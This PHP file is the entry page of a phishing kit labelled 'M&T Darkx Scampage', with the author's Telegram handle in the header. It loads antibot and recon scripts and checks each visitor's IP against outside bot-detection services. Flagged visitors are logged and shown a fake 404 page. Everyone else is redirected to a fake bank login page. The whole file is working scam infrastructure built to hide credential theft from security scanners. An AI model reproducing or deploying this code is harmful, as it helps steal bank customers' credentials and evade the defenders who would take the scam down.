<?php
session_start();

/**
 * M&T Darkx Scampage
 * version 1.0
 * Icq & telegram = @Darkx_Coder

**/
include'darkx/antibots.php';
include'darkx/recon.php';

        $ch=curl_init(); 
		curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);
		curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
		curl_setopt($ch,CURLOPT_URL,"https://api.iptrooper.net/check/".$_SESSION['ip']."?full=1");
		curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,0);
		curl_setopt($ch,CURLOPT_TIMEOUT,400);
		$json=curl_exec($ch);

		$ch=curl_init(); 
		curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);
		curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
		curl_setopt($ch,CURLOPT_URL,"https://spox-coder.info/spox/check_ip.php?ip=".$lp."");
		curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,0);
		curl_setopt($ch,CURLOPT_TIMEOUT,400);
		$json=curl_exec($ch);
		curl_close($ch);

				$check = trim(strip_tags(get_string_between($json,'"bad":',',"')));
				$type = trim(strip_tags(get_string_between($json,'"type":"','"')));

			$key = substr(sha1(mt_rand()),1,25);
			
			 if ($check == "true") {	
			$content = "#>".$_SESSION['ip']." [ ".$type." ] - [ ".$_SESSION['country']." ] - [ ".$_SESSION['countrycode']." ]\r\n";
		    $save=fopen("darkx/access/bots.txt","a+");
		    fwrite($save,$content);
		    fclose($save);
			header("HTTP/1.0 404 Not Found");exit();
}
			else {
            $key = substr(sha1(mt_rand()),1,25);
            header("Location: login.php?online_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode']."");
            }
        
?>